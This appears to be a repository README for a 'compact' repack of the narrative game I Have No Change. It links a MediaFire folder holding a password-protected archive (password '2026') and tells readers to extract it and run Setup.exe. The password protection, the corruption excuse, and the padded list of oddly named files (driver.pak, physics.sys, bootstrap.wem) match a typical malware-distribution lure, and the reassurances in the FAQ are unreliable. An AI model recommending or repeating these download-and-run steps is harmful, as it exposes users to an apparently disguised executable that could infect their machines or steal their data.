## 🕹️ About

I Have No Change is a first-person narrative simulation set in a small Russian town on New Year's Eve. You play as Matvey, a 27-year-old working the night shift at a roadside kiosk, serving customers whose personal stories gradually unfold through conversation. Explore the kiosk, handle everyday transactions, meet local residents, and make choices that shape the flow of the evening. The game focuses on atmosphere, human connection, and the quiet space between the life you live and the life you imagined. This compact release uses high-ratio compression to reduce download size while keeping the game itself unchanged.

This game is for players who enjoy atmospheric first-person adventures, grounded stories, and thoughtful character-driven experiences.

## ✨ Features

- 🌙 **One Night in Winter** — Experience a carefully paced story unfolding across a single New Year's Eve.
- 🧾 **Kiosk Shift** — Serve customers, manage everyday transactions, and observe life beyond the counter.
- 📦 **Compact Packaging** — High-ratio compression provides a smaller archive without changing the game content.
- 🎭 **Real Performances** — Character performances and detailed animation bring every encounter to life.
- 💬 **Human Stories** — Talk with memorable residents whose lives intersect during the night.

This release is distributed as a compact, compressed archive. The game itself is unchanged — only the packaging is smaller.

### Step 1: Download

Download the compact archive from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the build expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- settings.bin <- Configuration
|-- driver.pak <- Driver archive
|-- Password 2026.txt <- Password reminder (empty)
|-- lang.sys <- Language system
|-- scripts.lic <- Game scripts
|-- localization.ini <- Language files
|-- animations.dll <- Animation system
|-- audio.res <- Audio resources
|-- res.pak <- Resources archive
|-- api.pak <- API modules
|-- launcher.dll <- Launcher library
|-- license.wem <- Audio assets
|-- uninstall.key <- Uninstall key
|-- update_1.res <- Update resources
|-- physics.sys <- Physics engine
|-- installer.dat <- Installer data
|-- patch_1.bnk <- Audio banks
|-- license.bank <- License data
|-- dlc.md5 <- DLC checksums
|-- assets.wem <- Asset audio
|-- update_1.ini <- Update config
|-- global.cfg <- Global settings
|-- driver.umap <- Driver data
|-- bootstrap.wem <- Bootstrap audio
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start

## ❓ Frequently Asked Questions (FAQ)

**Q: Is the game modified in any way?**
**A:** No. The game is exactly the same as the original release. Only the packaging is different — compression is a delivery choice, not a modification of the game.

**Q: Why is the archive password-protected?**
**A:** The password prevents the archive from being corrupted during transfer and keeps the files bundled correctly. The password is provided in the download section.

**Q: What platforms are supported?**
**A:** The current focus is Windows. Other platforms are not part of the active roadmap at this time.

**Q: How can I report a bug?**
**A:** Open an issue in the Issues tab with a clear description, your system specs, and steps to reproduce. Screenshots or logs help a lot.

**Q: How often is the compact release updated?**
**A:** The archive is rebuilt whenever the source files change. Check the Releases page for updates.
